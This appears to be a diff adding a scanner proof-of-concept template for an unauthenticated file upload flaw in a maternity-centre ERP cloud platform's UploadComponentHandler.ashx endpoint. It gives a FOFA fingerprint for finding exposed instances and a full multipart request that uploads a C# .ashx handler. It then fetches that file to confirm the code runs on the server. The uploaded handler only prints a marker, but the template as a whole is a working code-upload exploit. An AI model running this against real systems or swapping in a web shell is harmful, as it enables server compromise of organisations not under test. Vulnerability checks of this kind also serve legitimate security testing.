@@ -1,0 +1,67 @@
+id: poc-yaml-jintongfang-erp-uploadcomponenthandler-upload
+info:
+  name: 月子会所ERP管理云平台 UploadComponentHandler.ashx接口存在文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 月子会所ERP管理云平台
+  fofa: app="妈妈宝盒-ERP"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /Page/upload/UploadComponentHandler.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="1.ashx"
+
+
+    <% @ webhandler language="C#" class="AverageHandler" %>
+
+    using System;
+
+    using System.Web;
+
+
+    public class AverageHandler : IHttpHandler
+
+    {
+
+    public bool IsReusable {
+
+    get {
+
+    return true;
+
+    }
+
+    }
+
+    public void ProcessRequest(HttpContext ctx)
+
+    {
+
+    ctx.Response.Write("vulnerability{{.t1}}");
+
+    }
+
+    }
+
+    --00content0boundary00--
+
+    '
+  output:
+  - regex_match(body,`UploadBaseFolder/ERP(?P<filename>.*?).ashx`)
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /UploadBaseFolder/ERP/{{.filename}}.ashx
+  expression: 'status_code == 200 &&
+
+    body == "vulnerability" + t1
+
+    '
+transport: http
